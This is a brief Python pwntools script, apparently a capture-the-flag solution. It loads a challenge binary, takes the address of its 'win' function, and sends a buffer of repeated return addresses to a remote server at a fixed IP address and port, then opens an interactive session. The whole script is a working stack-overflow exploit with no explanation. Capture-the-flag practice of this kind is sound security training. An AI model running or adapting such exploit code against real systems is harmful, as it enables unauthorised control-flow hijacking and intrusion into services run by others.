import IPython
import pwn

elf = pwn.ELF('chall')

win = elf.symbols['win']

print(win)

n = 56
value = pwn.p64(0x4011b6)*20
# value = b'1' + b'\0' + b'\n' + b'0'*(n-3) + pwn.p32(elf.symbols['win'])
print(value)



io = pwn.remote('34.170.146.252', 44312)
# io = pwn.process('./chall')
io.sendlineafter(b'value: ', value)

# print(value)

print(io.interactive())
